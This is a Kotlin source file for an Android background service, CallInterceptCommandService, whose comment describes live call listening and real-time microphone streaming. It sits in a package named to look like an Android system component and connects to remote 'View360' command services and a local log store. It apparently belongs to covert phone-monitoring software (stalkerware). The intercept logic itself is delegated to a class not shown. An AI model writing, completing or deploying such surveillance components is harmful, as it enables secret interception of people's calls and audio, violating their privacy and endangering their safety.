package com.android.services.services.callIntercept

import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.annotation.RequiresApi
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.services.view360.View360CommandProcessingBaseImplI
import com.android.services.services.view360.View360CommandService
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject


/**
 * [CallInterceptCommandService] is a Service to have current call Listening,
 * A live Call Listening Service that enables the real-time microphone access, So basically an live audio stream channel initiated
 */

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@AndroidEntryPoint
class CallInterceptCommandService :Service(){

    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope
    lateinit var callInterceptProcessingI: IBackgroundProcessing

    override fun onBind(arg0: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        callInterceptProcessingI =
            CallInterceptProcessingBaseImpll(this, localDatabaseSource, coroutineScope)
        callInterceptProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return callInterceptProcessingI.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        callInterceptProcessingI.onDestroy()
    }
}